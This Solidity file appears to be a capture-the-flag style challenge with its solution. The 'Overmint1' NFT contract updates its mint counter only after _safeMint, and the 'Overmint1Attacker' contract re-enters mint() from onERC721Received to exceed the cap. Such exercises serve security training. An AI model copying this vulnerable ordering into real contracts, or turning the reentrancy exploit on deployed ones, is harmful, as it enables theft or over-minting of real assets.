// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract Overmint1Attacker is IERC721Receiver {
    // Counter to track number of mints
    uint256 private mintCount;
    
    // Reference to target contract
    Overmint1 public target;
    
    constructor(address _target) {
        target = Overmint1(_target);
    }
    
    // Function to start the attack
    function attack() external {
        // Start with first mint
        target.mint();
    }
    
    // This function is called by _safeMint
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Increment our count
        mintCount++;
        
        // If we haven't minted 5 NFTs yet, mint again
        if (mintCount < 5) {
            target.mint();
        }
        
        // Return the expected selector
        return IERC721Receiver.onERC721Received.selector;
    }
}
